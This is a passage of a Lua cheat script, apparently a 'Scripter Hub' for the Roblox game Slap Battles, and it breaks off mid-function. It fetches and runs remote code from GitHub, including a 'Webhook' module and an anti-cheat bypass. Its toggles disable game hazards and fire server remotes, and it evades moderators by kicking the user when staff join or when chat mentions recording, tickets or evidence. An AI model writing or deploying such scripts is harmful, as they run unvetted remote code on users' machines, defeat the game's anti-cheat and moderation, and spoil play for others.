--Webhook
local WebhookScripterHub = loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter-Coder/Scripter-Coder/refs/heads/main/Universal/Webhook"))()

--Start Of Script
--Detect Place Name
local MarketplaceService = game:GetService("MarketplaceService")
local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local gameName = placeInfo.Name

--Library
local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter-Coder/Scripter-Coder/refs/heads/main/Universal/Orion%20Hub%20Library"))()

--Startup Script Notification
OrionLib:MakeNotification({Name = "From Scripter",Content = "Script Loads (Can Take 1-5 Seconds)",Image = "rbxassetid://7734059095",Time = 1})

--If Slap Battles Then
if game.PlaceId == 6403373529 or game.PlaceId == 9015014224 or game.PlaceId == 11520107397 or game.PlaceId == 124596094333302 or game.PlaceId == 124596094333302 then
local Window = OrionLib:MakeWindow({
    Name = gameName .. " Hub (Scripter Hub) OP V. 11.1.8",
    HidePremium = true,
    SaveConfig = false,
    ConfigFolder = configsFolder,
    IntroEnabled = true,
    IntroText = gameName,
    IntroIcon = "rbxassetid://15315284749",
    ToggleIcon = "assetid://7734091286"})

OrionLib:MakeNotification({Name = "From Scripter",Content = "GoodLuck!",Image = "rbxassetid://7734059095",Time = 3})

local Tab = Window:MakeTab({
    Name = "Welcome",
    Icon = "rbxassetid://7734059095",
    PremiumOnly = false
})

local player = game.Players.LocalPlayer
Tab:AddLabel("Hello " .. player.Name .. "!")

Section = Tab:AddSection({
    Name = "Before u will start using mine script would u like to bypass anticheat?"
})

Tab:AddButton({
	Name = "Bypass All Anticheat",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RobScripter/Slap-Battles/main/BypassAntiCheat.lua"))()
task.wait(1.5)
OrionLib:MakeNotification({Name = "Success",Content = "Bypassed All Anticheat",Image = "rbxassetid://7733715400",Time = 3})
end
})

local Tab = Window:MakeTab({
    Name = "Info",
    Icon = "rbxassetid://7734053426",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "Normal"
})

CheckSlaps = Tab:AddLabel("Check Slaps: [ "..game.Players.LocalPlayer.leaderstats.Slaps.Value.." ]")
GloveUses = Tab:AddLabel("Glove Using: [ "..game.Players.LocalPlayer.leaderstats.Glove.Value.." ]")
PositionShower = Tab:AddLabel("Your Position: [ "..tostring(math.round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X)..", "..
math.round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y)..", "..math.round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)).." ]")

if not game.Workspace:FindFirstChild("JetOrb") then
JetOrbSpawn = Tab:AddLabel("Detected Jet Orb: [ No ]")
else
JetOrbSpawn = Tab:AddLabel("Detected Jet Orb: [ Yes ]")
end

if not game.Workspace:FindFirstChild("PhaseOrb") then
PhaseOrbSpawn = Tab:AddLabel("Detected Phase Orb: [ No ]")
else
PhaseOrbSpawn = Tab:AddLabel("Detected Phase Orb: [ Yes ]")
end

if not game.Workspace:FindFirstChild("GoldenSlapple") then
GoldenSlappleSpawn = Tab:AddLabel("Detected Golden Slapple: [ No ]")
else
GoldenSlappleSpawn = Tab:AddLabel("Detected Golden Slapple: [ Yes ]")
end

if not game.Workspace:FindFirstChild("GlitchOrb") then
GlitchOrbSpawn = Tab:AddLabel("Detected Glitch Orb: [ No ]")
else
GlitchOrbSpawn = Tab:AddLabel("Detected Glitch Orb: [ Yes ]")
end

if not game.Workspace:FindFirstChild("Toolbox") then
ToolboxSpawn = Tab:AddLabel("Detected Toolbox: [ No ]")
else
ToolboxSpawn = Tab:AddLabel("Detected Toolbox: [ Yes ]")
end

if not game.Workspace:FindFirstChild("SiphonOrb") then
SiphonOrbSpawn = Tab:AddLabel("Detected Siphon Orb: [ No ]")
else
SiphonOrbSpawn = Tab:AddLabel("Detected Siphon Orb: [ Yes ]")
end

if not game.Workspace:FindFirstChild("MATERIALIZEOrb") then
SiphonOrbSpawn = Tab:AddLabel("Detected Materialize Orb: [ No ]")
else
SiphonOrbSpawn = Tab:AddLabel("Detected Materialize Orb: [ Yes ]")
end

if not game.Workspace:FindFirstChild("TapeRecorder") then
TapeRecorderChecker = Tab:AddLabel("Is Tape Recorder Spawned? [ No ]")
else
TapeRecorderChecker = Tab:AddLabel("Is Tape Recorder Spawned? [ Yes ]")

if not game.Workspace:FindFirstChild("Gravestone") then
GraveSpawn = Tab:AddLabel("Detected Grave: [ No ]")
else
GraveSpawn = Tab:AddLabel("Detected Grave: [ Yes ]")
end

end

Tab:AddButton({
    Name = "Show Obtained Gloves (Prints)",
    Callback = function()
        warn("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")

        local player = game:GetService("Players").LocalPlayer
        local unlockedGlovesFolder = player:WaitForChild("_unlockedGloves")

        for _, glove in ipairs(unlockedGlovesFolder:GetChildren()) do
            if glove:IsA("BoolValue") then
                if glove.Value then
                    print("✅" .. glove.Name)
                else
                    print("❌" .. glove.Name)
                end
            end
        end

        warn("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")
    end
})

Tab:AddButton({
    Name = "Show Obtained Gamepasses (Prints)",
    Callback = function()
        warn("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")

        local Players = game:GetService("Players")
        local MarketplaceService = game:GetService("MarketplaceService")
        local player = Players.LocalPlayer

        local gamepasses = {
            [16127797] = "nothing",
            [16067226] = "Radio",
            [37665008] = "Animation Pack",
            [21651535] = "Custom death audio",
            [19150776] = "Spectator",
            [15037108] = "2x Slaps",
            [174818129] = "Cannoneer",
            [45176930] = "Vampire",
            [85895851] = "Ultra Instinct",
            [33742082] = "CUSTOM GLOVE",
            [16361133] = "OVERKILL",
            [15037147] = "5x Slaps",
            [24543658] = "250",
            [18677987] = "court evidence",
            [16109159] = "expensive gamepass",
            [15759861] = "HECKING DONATION",
            [15759819] = "Donation <3"
        }

        for id, name in pairs(gamepasses) do
            task.spawn(function()
                local success, hasPass = pcall(function()
                    return MarketplaceService:UserOwnsGamePassAsync(player.UserId, id)
                end)

                if success then
                    if hasPass then
                        print(name .. " ✅ (ID: " .. id .. ")")
                    else
                        print(name .. " ❌ (ID: " .. id .. ")")
                    end
                else
                    warn("Failed to check ownership for " .. name .. " (ID: " .. id .. ")")
                end
            end)
        end

        warn("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")
    end
})

TimeServer = Tab:AddLabel("Server Time: [ "..math.floor(workspace.DistributedGameTime / 60 / 60).." Hour | "..math.floor(workspace.DistributedGameTime / 60) - (math.floor(workspace.DistributedGameTime / 60 / 60) * 60).." Minute | "..math.floor(workspace.DistributedGameTime) - (math.floor(workspace.DistributedGameTime / 60) * 60).." Second ]")
ViewAgeServer = Tab:AddLabel("Server's Age: [ "..game.Workspace.Lobby.ServerAge.Text.SurfaceGui.TextLabel.Text.." ]")
Tab:AddParagraph("Game's ID: [ "..game.PlaceId.." ]","Server ID: [ "..game.JobId.." ]")
ViewJobId = Tab:AddLabel("Server's Job ID: [ "..game.JobId.." ]")
CodeKeypad = Tab:AddLabel("Code Keypad: [ "..tostring((#game.Players:GetPlayers()) * 25 + 1100 - 7).." ]")

if not game.Workspace:FindFirstChild("Keypad") then
KeypadSpawn = Tab:AddLabel("Keypad Spawn: [ No ]")
else
KeypadSpawn = Tab:AddLabel("Keypad Spawn: [ Yes ]")
end

ServerPlayers = Tab:AddLabel("Players In Server: [ "..#game.Players:GetPlayers().." / "..game.Players.MaxPlayers.." ]")

local AutoSetInfoServer
AutoSetInfo = Tab:AddToggle({
	Name = "Auto Set Info",
	Default = false,
	Callback = function(Value)
_G.AutoSetInfo = Value
AutoSetInfoServer = game:GetService("RunService").RenderStepped:Connect(function()
if _G.AutoSetInfo == true then

CheckCandyCorns:Set("Check Candy Corns: [ "..game:GetService("Players").LocalPlayer.PlayerGui.CandyCount.ImageLabel.TextLabel.Text.." ]")

CheckSlaps:Set("Check Slaps: [ "..game.Players.LocalPlayer.leaderstats.Slaps.Value.." ]")

GloveUses:Set("Glove Using: [ "..game.Players.LocalPlayer.leaderstats.Glove.Value.." ]")

PositionShower:Set("Your Position: [ "..tostring(math.round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X)..", "..
math.round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y)..", "..math.round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)).." ]")

if not game.Workspace:FindFirstChild("JetOrb") then
JetOrbSpawn:Set("Detected Jet Orb: [ No ]")
else
JetOrbSpawn:Set("Detected Jet Orb: [ Yes ]")
end

if not game.Workspace:FindFirstChild("PhaseOrb") then
PhaseOrbSpawn:Set("Detected Phase Orb: [ No ]")
else
PhaseOrbSpawn:Set("Detected Phase Orb: [ Yes ]")
end

if not game.Workspace:FindFirstChild("GoldenSlapple") then
GoldenSlappleSpawn:Set("Detected Golden Slapple: [ No ]")
else
GoldenSlappleSpawn:Set("Detected Golden Slapple: [ Yes ]")
end

if not game.Workspace:FindFirstChild("GlitchOrb") then
GlitchOrbSpawn:Set("Detected Glitch Orb: [ No ]")
else
GlitchOrbSpawn:Set("Detected Glitch Orb: [ Yes ]")
end

if not game.Workspace:FindFirstChild("Toolbox") then
ToolboxSpawn:Set("Detected Toolbox: [ No ]")
else
ToolboxSpawn:Set("Detected Toolbox: [ Yes ]")
end

if not game.Workspace:FindFirstChild("SiphonOrb") then
SiphonOrbSpawn:Set("Detected Siphon Orb: [ No ]")
else
SiphonOrbSpawn:Set("Detected Siphon Orb: [ Yes ]")
end

if not game.Workspace:FindFirstChild("MATERIALIZEOrb") then
SiphonOrbSpawn:Set("Detected Materialize Orb: [ No ]")
else
SiphonOrbSpawn:Set("Detected Materialize Orb: [ Yes ]")
end

 if not game.Workspace:FindFirstChild("TapeRecorder") then
            TapeRecorderChecker:Set("Is Tape Recorder Spawned? [ No ]")
        else
            TapeRecorderChecker:Set("Is Tape Recorder Spawned? [ Yes ]")
        end

if not game.Workspace:FindFirstChild("Gravestone") then
GraveSpawn:Set("Detected Grave: [ No ]")
else
GraveSpawn:Set("Detected Grave: [ Yes ]")
end

TimeServer:Set("Server Time: [ "..math.floor(workspace.DistributedGameTime / 60 / 60).." Hour | "..math.floor(workspace.DistributedGameTime / 60) - (math.floor(workspace.DistributedGameTime / 60 / 60) * 60).." Minute | "..math.floor(workspace.DistributedGameTime) - (math.floor(workspace.DistributedGameTime / 60) * 60).." Second ]")

ViewAgeServer:Set("Server's Age: [ "..game.Workspace.Lobby.ServerAge.Text.SurfaceGui.TextLabel.Text.." ]")

ViewJobId:Set("Server's Job ID: [ "..game.JobId.." ]")

CodeKeypad:Set("Code Keypad: [ "..tostring((#game.Players:GetPlayers()) * 25 + 1100 - 7).." ]")

if not game.Workspace:FindFirstChild("Keypad") then
KeypadSpawn:Set("Keypad Spawn: [ No ]")
else
KeypadSpawn:Set("Keypad Spawn: [ Yes ]")
end

ServerPlayers:Set("Players In Server [ "..#game.Players:GetPlayers().." / "..game.Players.MaxPlayers.." ]")
    elseif _G.AutoSetInfo == false then
	    if AutoSetInfoServer then
		    AutoSetInfoServer:Disconnect()
		        AutoSetInfoServer = nil
	end
end
end)
	end    
})

local Tab = Window:MakeTab({
	Name = "Anti",
	Icon = "rbxassetid://7734056608",
	PremiumOnly = false
	})

Tab:AddParagraph("Anti Toggle Ideas:","If u want to add smt on anti glove inside Anti Tab then make sure to go my discord server and make a forum inside #Script-Ideas Channel then it also depends there 50/50 it can/cant work")

Section = Tab:AddSection({
    Name = "Universal"
})

Tab:AddButton({
	Name = "Anti Void",
	Callback = function()
--ANTI VOID--
if workspace:FindFirstChild("AntiVoid") == nil then
--ANTI VOID--
local Safespot = Instance.new("Part",workspace)
Safespot.Name = "AntiVoid"
Safespot.Position = Vector3.new(-51, -12, 108)
Safespot.Size = Vector3.new(1000000, 1, 1000000)
Safespot.Anchored = true
Safespot.CanCollide = true
Safespot.Transparency = .5
--ANTI VOID--
OrionLib:MakeNotification({Name = "Success",Content = "Created Successfully!",Image = "rbxassetid://7733715400",Time = 3})
else
game.workspace.AntiVoid:Destroy()
OrionLib:MakeNotification({Name = "Success",Content = "Removed Successfully!",Image = "rbxassetid://7733715400",Time = 3})
end
end
})

AntiPortal = Tab:AddToggle({
	Name = "Anti Portal",
	Default = false,
	Callback = function(Value)
_G.AntiPortal = Value
if _G.AntiPortal == true then
for i,v in pairs(workspace.Lobby:GetChildren()) do
if v.Name == "Teleport2" and v.Name == "Teleport3" and v.Name == "Teleport4" and v.Name == "Teleport6" then
if v.CanTouch == true then
v.CanTouch = false
end
end
end
else
for i,v in pairs(workspace.Lobby:GetChildren()) do
if v.Name == "Teleport2" and v.Name == "Teleport3" and v.Name == "Teleport4" and v.Name == "Teleport6" then
if v.CanTouch == false then
v.CanTouch = true
end
end
end
end
	end    
})

AntiAdmin = Tab:AddToggle({
	Name = "Anti Mod | Admin",
	Default = false,
	Callback = function(Value)
_G.AntiMods = Value
while _G.AntiMods do
for i,v in pairs(game.Players:GetChildren()) do
        if v:GetRankInGroup(9950771) >= 2 then
         _G.AntiKick = false
     game.Players.LocalPlayer:Kick("High Rank Player Detected.".." [ "..v.Name.." ]")
   break
     end
end
task.wait()
end
	end    
})

AntiKick = Tab:AddToggle({
	Name = "Anti Kick",
	Default = false,
	Callback = function(Value)
	_G.AntiKick = Value
while _G.AntiKick do
for i,v in pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetDescendants()) do
                    if v.Name == "ErrorPrompt" then
game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
                    end
                end
task.wait()
end
	end    
})

AntiAfk = Tab:AddToggle({
	Name = "Anti Afk",
	Default = false,
	Callback = function(Value)
	_G.AntiAfk = Value
local VirtualUser = game:GetService('VirtualUser')

game:GetService('Players').LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)
	end    
})

AntiRecord = Tab:AddToggle({
	Name = "Anti Record",
	Default = false,
	Callback = function(Value)
_G.AntiRecord = Value
	end    
})
for i,p in pairs(game.Players:GetChildren()) do
if p ~= game.Players.LocalPlayer then
p.Chatted:Connect(function(message)
Words = message:split(" ")
if _G.AntiRecord == true then
for i, v in pairs(Words) do
if v:lower():match("recording") or v:lower():match(" rec") or v:lower():match("record") or v:lower():match("discor") or v:lower():match(" disco") or v:lower():match(" disc") or v:lower():match("ticket") or v:lower():match("tickets") or v:lower():match(" ds") or v:lower():match(" dc") or v:lower():match("dizzy") or v:lower():match("dizzycord") or v:lower():match(" clip") or v:lower():match("proof") or v:lower():match("evidence") then
AntiKick:Set(false)
game.Players.LocalPlayer:Kick("Possible player recording detected.".." [ "..p.Name.." ]".." [ "..message.." ]")
end
end
end
end)
end
end
game.Players.PlayerAdded:Connect(function(Player)
Player.Chatted:Connect(function(message)
Words = message:split(" ")
if _G.AntiRecord == true then
for i, v in pairs(Words) do
if v:lower():match("recording") or v:lower():match(" rec") or v:lower():match("record") or v:lower():match("discor") or v:lower():match(" disco") or v:lower():match(" disc") or v:lower():match("ticket") or v:lower():match("tickets") or v:lower():match(" ds") or v:lower():match(" dc") or v:lower():match("dizzy") or v:lower():match("dizzycord") or v:lower():match(" clip") or v:lower():match("proof") or v:lower():match("evidence") then
AntiKick:Set(false)
game.Players.LocalPlayer:Kick("Possible player recording detected.".." [ "..Player.Name.." ]".." [ "..message.." ]")
end
end
end
end)
end)

AntiBarzil = Tab:AddToggle({
	Name = "Anti Barzil",
	Default = false,
	Callback = function(Value)
		_G.AntiBarzil = Value

		while _G.AntiBarzil do
			for _, v in pairs(workspace.Lobby.brazil:GetDescendants()) do
				if v:IsA("Part") and v.CanTouch == true then
					v.CanTouch = false
				end
			end
			task.wait(1) -- prevent lag by waiting a bit
		end

		-- Re-enable CanTouch when toggle is turned off
		if not _G.AntiBarzil then
			for _, v in pairs(workspace.Lobby.brazil:GetDescendants()) do
				if v:IsA("Part") and v.CanTouch == false then
					v.CanTouch = true
				end
			end
		end
	end
})

AntiCOD = Tab:AddToggle({
	Name = "Anti Cube Of Death",
	Default = false,
	Callback = function(Value)
		if Value == true then
if game.Workspace:FindFirstChild("the cube of death(i heard it kills)", 1) and game.Workspace.Arena.CubeOfDeathArea["the cube of death(i heard it kills)"]:FindFirstChild("Part") then
game.Workspace.Arena.CubeOfDeathArea["the cube of death(i heard it kills)"].CanTouch = false
game.Workspace.Arena.CubeOfDeathArea["the cube of death(i heard it kills)"].Part.CanTouch = false
end
else
if game.Workspace:FindFirstChild("the cube of death(i heard it kills)", 1) and game.Workspace.Arena.CubeOfDeathArea["the cube of death(i heard it kills)"]:FindFirstChild("Part") then
game.Workspace.Arena.CubeOfDeathArea["the cube of death(i heard it kills)"].CanTouch = true
game.Workspace.Arena.CubeOfDeathArea["the cube of death(i heard it kills)"].Part.CanTouch = true
end
end
	end    
})

AntiDeath = Tab:AddToggle({
	Name = "Anti Death Barriers",
	Default = false,
	Callback = function(Value)
		if Value == true then
for i,v in pairs(game.Workspace.DEATHBARRIER:GetChildren()) do
                    if v.ClassName == "Part" and v.Name == "BLOCK" then
                        v.CanTouch = false
                    end
                end
workspace.DEATHBARRIER.CanTouch = false
workspace.DEATHBARRIER2.CanTouch = false
workspace.dedBarrier.CanTouch = false
workspace.ArenaBarrier.CanTouch = false
workspace.AntiDefaultArena.CanTouch = false
else
for i,v in pairs(game.Workspace.DEATHBARRIER:GetChildren()) do
                    if v.ClassName == "Part" and v.Name == "BLOCK" then
                        v.CanTouch = true
                    end
                end
workspace.DEATHBARRIER.CanTouch = true
workspace.DEATHBARRIER2.CanTouch = true
workspace.dedBarrier.CanTouch = true
workspace.ArenaBarrier.CanTouch = true
workspace.AntiDefaultArena.CanTouch = true
end
	end    
})

AntiRagdoll = Tab:AddToggle({
	Name = "Anti Ragdoll",
	Default = false,
	Callback = function(Value)
        _G.AntiRagdoll = Value
while _G.AntiRagdoll do
if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and game.Players.LocalPlayer.Character:FindFirstChild("Torso") and game.Players.LocalPlayer.Character:FindFirstChild("Ragdolled") then
if game.Players.LocalPlayer.Character:FindFirstChild("Ragdolled") and game.Players.LocalPlayer.Character:WaitForChild("Ragdolled").Value == true then
repeat task.wait()
if game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
game.Players.LocalPlayer.Character.Torso.Anchored = true
end
until game.Players.LocalPlayer.Character:FindFirstChild("Ragdolled") and game.Players.LocalPlayer.Character:WaitForChild("Ragdolled").Value == false
if game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
game.Players.LocalPlayer.Character.Torso.Anchored = false
end
end
end
task.wait()
end
	end    
})

AntiHunterBox = Tab:AddToggle({
	Name = "Anti Hunter Box",
	Default = false,
	Callback = function(Value)
		_G.AntiHunterBox = Value

		while _G.AntiHunterBox do
			for _, v in pairs(workspace.BountyHunterRoom.Build.Model["Meshes/boxshadow_Cube.005"]:GetDescendants()) do
				if v.Name == "Hitbox" and v.CanTouch == true then
					v.CanTouch = false
				end
			end
			task.wait(1) -- prevent lag by waiting a bit
		end

		-- Re-enable CanTouch when toggle is turned off
		if not _G.AntiHunterBox then
			for _, v in pairs(workspace.BountyHunterRoom.Build.Model["Meshes/boxshadow_Cube.005"]:GetDescendants()) do
				if v.Name == "Hitbox" and v.CanTouch == false then
					v.CanTouch = true
				end
			end
		end
	end
})

Section = Tab:AddSection({
    Name = "Glove's Abilities"
})

AntiBrick = Tab:AddToggle({
	Name = "Anti Brick",
	Default = false,
	Callback = function(Value)
_G.AntiBrick = Value
while _G.AntiBrick do
for i,v in pairs(game.Workspace:GetChildren()) do
                    if v.Name == "Union" then
                        v.CanTouch = false
                        v.CanQuery = false
                    end
                end
task.wait()
end
	end    
})

AntiStun = Tab:AddToggle({
	Name = "Anti Stun",
	Default = false,
	Callback = function(Value)
		_G.AntiStun = Value
while _G.AntiStun do
if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") and game.Workspace:FindFirstChild("Shockwave") and game.Players.LocalPlayer.Character.Ragdolled.Value == false then
game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
end
task.wait()
end
	end    
})

AntiZa = Tab:AddToggle({
	Name = "Anti Za Hando",
	Default = false,
	Callback = function(Value)
	_G.AntiZaHando = Value
            while _G.AntiZaHando do
                for i,v in pairs(game.Workspace:GetChildren()) do
                    if v.ClassName == "Part" and v.Name == "Part" then
                        v:Destroy()
                    end
                end
task.wait()
            end
	end    
})

AntiFort = Tab:AddToggle({
	Name = "Anti Fort",
	Default = false,
	Callback = function(Value)
	_G.AntiFort = Value
            while _G.AntiFort do
                for i,v in pairs(game.Workspace:GetChildren()) do
                    if v.Name == "Part" then
                        v.CanCollide = false
                    end
                end
task.wait()
            end
	end    
})

AntiPusher = Tab:AddToggle({
	Name = "Anti Pusher",
	Default = false,
	Callback = function(Value)
		_G.AntiPusher = Value
while _G.AntiPusher do
for i,v in pairs(game.Workspace:GetChildren()) do
                    if v.Name == "wall" then
                        v.CanCollide = false
                    end
                end
task.wait()
end
	end    
})

AntiMail = Tab:AddToggle({
	Name = "Anti Mail",
	Default = false,
	Callback = function(Value)
game.Players.LocalPlayer.Character.YouHaveGotMail.Disabled = Value
_G.AntiMail = Value
while _G.AntiMail do
if game.Players.LocalPlayer.Character:FindFirstChild("YouHaveGotMail") then
game.Players.LocalPlayer.Character.YouHaveGotMail.Disabled = true
end
task.wait()
end
	end    
})

AntiSquid = Tab:AddToggle({
	Name = "Anti Squid",
	Default = false,
	Callback = function(Value)
	_G.AntiSquid = Value
if _G.AntiSquid == false then
game.Players.LocalPlayer.PlayerGui.SquidInk.Enabled = true
end
while _G.AntiSquid do
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("SquidInk") then
game.Players.LocalPlayer.PlayerGui.SquidInk.Enabled = false
end
task.wait()
end
	end    
})

AntiReaper = Tab:AddToggle({
	Name = "Anti Reaper",
	Default = false,
	Callback = function(Value)
	_G.AntiReaper = Value
            while _G.AntiReaper do
for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if v.Name == "DeathMark" then
                        game:GetService("ReplicatedStorage").ReaperGone:FireServer(game:GetService("Players").LocalPlayer.Character.DeathMark)
                    game:GetService("Lighting"):WaitForChild("DeathMarkColorCorrection"):Destroy() 
                    end
                end
task.wait()
end
	end    
})

AntiDefend = Tab:AddToggle({
	Name = "Anti Defend",
	Default = false,
	Callback = function(Value)
	_G.NoclipBarrier = Value
if _G.NoclipBarrier == false then
for i,v in pairs(game.Workspace:GetChildren()) do
                    if string.find(v.Name, "ÅBarrier") then
                        if v.CanCollide == false then
                            v.CanCollide = true
                         end
                    end
                end
           end
while _G.NoclipBarrier do
for i,v in pairs(game.Workspace:GetChildren()) do
                    if string.find(v.Name, "ÅBarrier") then
                        if v.CanCollide == true then
                            v.CanCollide = false
                         end
                     end
                end
task.wait()
end
	end    
})

AntiConveyor = Tab:AddToggle({
	Name = "Anti Conveyor",
	Default = false,
	Callback = function(Value)
game:GetService("Players").LocalPlayer.PlayerScripts.LegacyClient.ConveyorVictimized.Disabled = Value
	end    
})

AntiBooster = Tab:AddToggle({
	Name = "Anti Booster",
	Default = false,
	Callback = function(Value)
		_G.AntiBooster = Value
while _G.AntiBooster do
for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if v.Name == "BoosterObject" then
                        v:Destroy()
                    end
                end
task.wait()
end
	end    
})

AntiBallBaller = Tab:AddToggle({
	Name = "Anti Ball Baller",
	Default = false,
	Callback = function(Value)
		_G.AntiBallBaller = Value
while _G.AntiBallBaller do
for i,v in pairs(game.Workspace:GetChildren()) do
                    if v.Name == "ClonedBall" then
                        v.CanTouch = false
                        v.CanCollide = true
                    end
                end
task.wait()
end
	end    
})

AntiJack = Tab:AddToggle({
	Name = "Anti Balloony",
	Default = false,
	Callback = function(Value)
game:GetService("Players").LocalPlayer.PlayerScripts.LegacyClient.BalloonyListener.Disabled = Value
	end    
})

Tab:AddToggle({
    Name = "Anti Pylon",
    Default = false,
    Callback = function(Value)
        local antiPylonActive = Value
        local antiPylonThread = nil
        
        -- Function to find and destroy pylon hitboxes
        local function destroyPylonHitboxes()
            -- Look for Pylon models in workspace
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("Model") and obj.Name:lower():find("pylon") then
                    -- Check for hitbox inside pylon
                    local hitbox = obj:FindFirstChild("Hitbox")
                    if not hitbox then
                        -- Try alternative names for hitbox
                        hitbox = obj:FindFirstChild("hitbox") or 
                                obj:FindFirstChild("Main") or
                                obj:FindFirstChild("MainPart") or
                                obj:FindFirstChild("Base")
                    end
                    
                    if hitbox and hitbox:IsA("BasePart") then
                        -- Destroy the hitbox
                        hitbox:Destroy()
                        
                        -- Also try to destroy the entire pylon if possible
                        pcall(function()
                            obj:Destroy()
                        end)
                        
                    end
                end
                
                -- Also check for parts named "Pylon" or similar
                if obj:IsA("BasePart") and obj.Name:lower():find("pylon") then
                    -- Check if this part is likely a hitbox
                    if obj:FindFirstChildWhichIsA("TouchTransmitter") then
                        obj:Destroy()
                        
                    end
                end
            end
        end
        
        -- Start/Stop the anti pylon thread
        if Value then
            -- Start anti pylon
            
            antiPylonThread = task.spawn(function()
                while antiPylonActive do
                    destroyPylonHitboxes()
                    task.wait(0.4) -- Check every 0.4 seconds
                end
            end)
        else
            -- Stop anti pylon
            antiPylonActive = false
            
            if antiPylonThread then
                task.cancel(antiPylonThread)
                antiPylonThread = nil
            end
            
        end
    end    
})

AntiSbeve = Tab:AddToggle({
	Name = "Anti Sbeve",
	Default = false,
	Callback = function(Value)
		_G.AntiSbeve = Value
while _G.AntiSbeve do
for _,v in pairs(game.Players:GetChildren()) do
                    if v ~= game.Players.LocalPlayer and v.Character:FindFirstChild("stevebody") then
                        v.Character:FindFirstChild("stevebody").CanTouch = false
                        v.Character:FindFirstChild("stevebody").CanQuery = false
                        v.Character:FindFirstChild("stevebody").CanCollide = false
                    end
                end
task.wait()
end
	end    
})

AntiTime = Tab:AddToggle({
	Name = "Anti Time Stop & Stop",
	Default = false,
	Callback = function(Value)
	_G.AntiTimestop = Value
while _G.AntiTimestop do
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if v.ClassName == "Part" then
                        v.Anchored = false
                    end
                end
task.wait()
end
	end    
})

AntiRock = Tab:AddToggle({
	Name = "Anti Megarock | Custom",
	Default = false,
	Callback = function(Value)
		_G.AntiRock = Value
while _G.AntiRock do
for _,v in pairs(game.Players:GetChildren()) do
                    if v.Character:FindFirstChild("rock") then
                        v.Character:FindFirstChild("rock").CanTouch = false
                        v.Character:FindFirstChild("rock").CanQuery = false
                    end
                end
task.wait()
end
	end    
})

AntiJack = Tab:AddToggle({
	Name = "Anti Hallow - Jack",
	Default = false,
	Callback = function(Value)
game:GetService("Players").LocalPlayer.PlayerScripts.LegacyClient.HallowJackAbilities.Disabled = Value
	end    
})

AntiReda = Tab:AddToggle({
	Name = "Anti [REDACTED]",
	Default = false,
	Callback = function(Value)
game:GetService("Players").LocalPlayer.PlayerScripts.LegacyClient.Well.Disabled = Value
	end    
})

AntiBus = Tab:AddToggle({
	Name = "Anti Bus",
	Default = false,
	Callback = function(Value)
		_G.AntiBus = Value
while _G.AntiBus do
for i,v in pairs(game.Workspace:GetChildren()) do
                    if v.Name == "BusModel" then
                        v.CanTouch = false
                    end
                end
task.wait()
end
	end    
})

AntiMittenBl = Tab:AddToggle({
	Name = "Anti Mitten Blind",
	Default = false,
	Callback = function(Value)
_G.AntiMittenBlind = Value
while _G.AntiMittenBlind do
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("MittenBlind") then
game.Players.LocalPlayer.PlayerGui:FindFirstChild("MittenBlind"):Destroy()
end
task.wait()
end
	end    
})

AntiBubble = Tab:AddToggle({
	Name = "Anti Bubble",
	Default = false,
	Callback = function(Value)
		 _G.AntiBubble = Value
while _G.AntiBubble do
for i,v in pairs(workspace:GetChildren()) do
                    if v.Name == "BubbleObject" and v:FindFirstChild("Weld") then
                        v:FindFirstChild("Weld"):Destroy()
                    end
               end
task.wait()
end
	end    
})

AntiObby = Tab:AddToggle({
	Name = "Anti Obby",
	Default = false,
	Callback = function(Value)
		_G.AntiObby = Value
while _G.AntiObby do
for _, v in pairs(game.Workspace:GetChildren()) do
          if string.find(v.Name, "LavaSpinner") or string.find(v.Name, "LavaBlock") then
             if v.CanTouch == true then
                 v.CanTouch = false
             end
         end
     end
task.wait()
end
if _G.AntiObby == false then
for _, v in pairs(game.Workspace:GetChildren()) do
          if string.find(v.Name, "LavaSpinner") or string.find(v.Name, "LavaBlock") then
              if v.CanTouch == false then
                  v.CanTouch = true
             end
         end
    end
end
	end    
})

AntiBoog = Tab:AddToggle({
	Name = "Anti Boogie Ball",
	Default = false,
	Callback = function(Value)
game:GetService("Players").LocalPlayer.PlayerScripts.LegacyClient.BoogieBallListener.Disabled = Value
	end    
})

AntiNull = Tab:AddToggle({
	Name = "Anti Null",
	Default = false,
	Callback = function(Value)
_G.AntiNull = Value
while _G.AntiNull do
for i,v in pairs(game.Workspace:GetChildren()) do
                if v.Name == "Imp" and v:FindFirstChild("Body") then
                       gloveHits[game.Players.LocalPlayer.leaderstats.Glove.Value]:FireServer(v.Body,true)
                 end
            end
task.wait()
end
	end    
})

AntiLure = Tab:AddToggle({
	Name = "Anti Lure",
	Default = false,
	Callback = function(Value)
		_G.AntiLure = Value
while _G.AntiLure do
for i,v in pairs(game.Workspace:GetChildren()) do
                    if string.find(v.Name, "_lure") and v:FindFirstChild("Root") and v:FindFirstChild("watercircle") then
